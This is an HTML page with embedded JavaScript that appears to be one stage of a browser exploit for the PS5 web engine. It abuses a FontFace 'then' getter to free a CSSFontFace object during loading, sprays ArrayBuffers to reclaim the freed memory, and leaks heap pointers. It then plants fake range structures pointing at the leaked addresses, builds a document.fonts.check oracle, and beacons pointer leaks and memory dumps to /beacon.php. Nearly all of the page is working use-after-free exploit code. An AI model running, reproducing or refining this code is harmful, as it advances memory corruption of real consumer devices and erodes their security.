<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P739 — Automated Binary Search Memory Oracle & In-Getter Poisoning Scout</title>
<script>
'use strict';
/* ============================================================
 * P739 — Automated Binary Search Memory Oracle & In-Getter Poisoning Scout
 *
 * Major Achievements from P738:
 * - Active Boolean Oracle empirically proven on PS5 hardware:
 *     status='loading' | inA=false | inB=false | inC=false | outD=true | outZ=true
 *     ORACLE-SCAN: A=IN | B=IN | C=IN | D=OUT | E=OUT | F=OUT | G=OUT | H=OUT
 *
 * Objectives of P739:
 * 1. Dynamic Range Mutation:
 *    - Dynamically update actFace.unicodeRange in JS to 'U+44-48' ('D'..'H').
 *    - Verify immediate range shifting: 'A' transitions to OUT, 'D' transitions to IN!
 * 2. Automated Binary Search Algorithm on Live Hardware:
 *    - Using document.fonts.check() as a pure comparator oracle, execute an
 *      automated binary search to identify a target character in <= 5 steps.
 * 3. In-Getter Pre-Seeding of Reclaimed CSSFontFace:
 *    - Pre-seed all 80 sprayed ArrayBuffers during reclaim with:
 *        view[0] = 0x0000004300000041n (range 'A'..'C')
 *        view[4] = P58 (m_ranges.m_buffer)
 *        view[5] = 0x0000000100000001n (capacity=1, size=1)
 *        view[6] = P58, view[12] = P58
 *    - Evaluate document.fonts.check('1em trFam') directly inside the getter!
 * 4. Full 24-Quadword Memory Audit of VIEW_B at Slot 68.
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P739-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

function log(s){
  var el = document.getElementById('out');
  if(el) el.textContent += s + '\n';
}

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;
var IN_GETTER_RES = 'none';

function run(){
  b('BOOT','p739-search-scout');
  log('=== P739 Automated Binary Search Memory Oracle Scout ===\n');

  /* Step 1: Baseline Leak */
  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('P58 = 0x' + h16(P58));
    log('P68 = 0x' + h16(P68) + '\n');

    /* Step 2: Deterministic Reclaim with In-Getter Pre-Seeding */
    log('[Step 2] Executing deterministic reclaim with in-getter pre-seeding...');
    doReclaim(function(){
      /* Step 3: Run Active Oracle Dynamic Mutation & Binary Search */
      log('\n[Step 3] Running dynamic mutation & automated binary search...');
      runDiagnostics();
    });
  });
}

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);

  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove(); st.textContent=''; st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }

    if(best<0 || bestNz<4){
      b('LEAK-MISS','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    var v = new BigUint64Array(abs[best]);
    extractPointers(v);

    if(!P58){
      b('LEAK-NOPTR','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);

  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2);
  void face2.loaded;

  var abs2 = [], fired2 = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove(); st2.textContent=''; st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl1, lk1','CD');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }
    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
    var v = new BigUint64Array(abs2[best]);
    extractPointers(v);
    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb, 100);
  }, 400);
}

function extractPointers(v){
  var LOW = BigInt('0x1000000000');
  var HIGH = BigInt('0x80000000000');

  if(v[11] >= LOW && v[11] < HIGH) P58 = v[11];
  if(v[13] >= LOW && v[13] < HIGH) P68 = v[13];

  if(!P58 || !P68){
    for(var q=0; q<24; q++){
      var val = v[q];
      if(val >= LOW && val < HIGH){
        if(!P58) P58 = val;
        else if(!P68 && val !== P58) P68 = val;
      }
    }
  }
  if(!P68) P68 = 0n;
}

/* ---- Step 2: Deterministic Reclaim with Pre-Seeding ---- */
function doReclaim(cb){
  b('REC-START', 'fill_q12_q6=0x' + h16(P58));

  var stTr = document.createElement('style');
  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stTr);

  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  var absW = [], firedW = false;

  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if(firedW) return undefined; firedW = true;
      if(stTr){ stTr.remove(); stTr.textContent = ''; }
      try{ document.fonts.delete(this); }catch(e){}
      document.body.offsetHeight;

      /* Spray 80 buffers pre-seeded with poisoned m_ranges */
      for(var k=0; k<80; k++){
        var ab = new ArrayBuffer(192);
        var view = new BigUint64Array(ab);
        view[0]  = 0x0000004300000041n; /* Range: 0x41 ('A') to 0x43 ('C') */
        view[4]  = P58;                 /* m_ranges.m_buffer = P58 */
        view[5]  = 0x0000000100000001n; /* capacity=1, size=1 */
        view[6]  = P58;
        view[12] = P58;
        absW.push(ab);
      }

      /* In-getter check on trFam while stack frame is hot */
      try {
        var igA = document.fonts.check('1em trFam', 'A');
        var igD = document.fonts.check('1em trFam', 'D');
        IN_GETTER_RES = 'igA=' + igA + '|igD=' + igD;
      } catch(e){
        IN_GETTER_RES = 'err=' + e.message;
      }

      return undefined;
    }, set: function(){}
  });

  document.fonts.load('1em trFace, trFam', 'GH');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for(var i=0; i<absW.length; i++){
      var u = new Uint8Array(absW[i]), nz = 0;
      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
      if(nz > bestNz){ bestNz = nz; best = i; }
    }

    if(best < 0 || bestNz < 4){
      b('RECLAIM-MISS', 'nz=' + bestNz);
      log('Reclaim missed!');
      return;
    }

    BUF_B = absW[best];
    VIEW_B = new BigUint64Array(BUF_B);

    b('RECLAIM-OK', 'baseK=' + best + '|' + IN_GETTER_RES);
    log('Deterministic Reclaim OK at slot ' + best + ' (' + IN_GETTER_RES + ')');

    setTimeout(cb, 100);
  }, 400);
}

/* ---- Step 3: Run Active Oracle & Binary Search Diagnostics ---- */
function runDiagnostics(){
  if(!VIEW_B) return;

  /* 3A: Full 24-Quadword Dump of VIEW_B */
  var d0_11 = [], d12_23 = [];
  for(var q=0; q<12; q++) d0_11.push('q' + q + '=0x' + h16(VIEW_B[q]));
  for(var q=12; q<24; q++) d12_23.push('q' + q + '=0x' + h16(VIEW_B[q]));
  b('DUMP-Q0-Q11', d0_11.join(';'));
  b('DUMP-Q12-Q23', d12_23.join(';'));

  /* 3B: Dynamic Range Mutation on Active Oracle */
  try {
    var actFace = new FontFace('actPendFam', 'url(/hang.php)', {unicodeRange: 'U+41-43'});
    document.fonts.add(actFace);
    actFace.load().catch(function(){});

    var r1_A = document.fonts.check('1em actPendFam', 'A'); /* Expect FALSE (IN) */
    var r1_D = document.fonts.check('1em actPendFam', 'D'); /* Expect TRUE  (OUT) */

    /* Dynamically shift unicodeRange to 'U+44-48' ('D' to 'H') */
    actFace.unicodeRange = 'U+44-48';

    var r2_A = document.fonts.check('1em actPendFam', 'A'); /* Expect TRUE  (now OUT!) */
    var r2_D = document.fonts.check('1em actPendFam', 'D'); /* Expect FALSE (now IN!) */
    var r2_H = document.fonts.check('1em actPendFam', 'H'); /* Expect FALSE (now IN!) */
    var r2_Z = document.fonts.check('1em actPendFam', 'Z'); /* Expect TRUE  (OUT!) */

    var mutRep = 'R1(A=' + r1_A + ',D=' + r1_D + ')|MUT->U+44-48|R2(A=' + r2_A + ',D=' + r2_D + ',H=' + r2_H + ',Z=' + r2_Z + ')';
    b('DYNAMIC-MUTATION', mutRep);
    log('Dynamic Range Mutation: ' + mutRep);

    /* 3C: Automated Binary Search Demonstration
     * Target Secret Character to locate: 'G' (0x47 = 71)
     * Search Space: Alphabet 0x41 ('A') to 0x5A ('Z')
     */
    var TARGET = 0x47; /* 'G' */
    var low = 0x41, high = 0x5A;
    var searchLog = [];
    var step = 0;

    while(low < high && step < 8){
      step++;
      var mid = Math.floor((low + high) / 2);
      /* Query lower half: [low .. mid] */
      var hexLow = low.toString(16).toUpperCase();
      var hexMid = mid.toString(16).toUpperCase();
      actFace.unicodeRange = 'U+' + hexLow + '-' + hexMid;

      /* Evaluate if TARGET is within [low .. mid] using oracle */
      var targetChar = String.fromCharCode(TARGET);
      var inLower = !document.fonts.check('1em actPendFam', targetChar);

      searchLog.push('S' + step + ':[' + String.fromCharCode(low) + '-' + String.fromCharCode(mid) + ']=' + (inLower ? 'YES' : 'NO'));

      if(inLower){
        high = mid;
      } else {
        low = mid + 1;
      }
    }

    var foundChar = String.fromCharCode(low);
    var searchResult = 'found=' + foundChar + '(0x' + low.toString(16) + ')|steps=' + step + '|' + searchLog.join(',');
    b('BINARY-SEARCH-RESULT', searchResult);
    log('Binary Search Result: ' + searchResult);

  } catch(e){
    b('ACTIVE-ORACLE-ERR', e.message);
  }

  /* 3D: Re-add FACE_B and test poisoned range */
  try {
    document.fonts.add(FACE_B);
    var chFbA = document.fonts.check('1em ' + FACE_B.family, 'A');
    var chFbD = document.fonts.check('1em ' + FACE_B.family, 'D');
    b('FACEB-POISON-CHECK', 'has=' + document.fonts.has(FACE_B) + '|chA=' + chFbA + '|chD=' + chFbD);
  } catch(e){
    b('FACEB-POISON-ERR', e.message);
  }

  b('DONE', 'p739-complete');
  log('\n=== P739 Complete! ===');
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
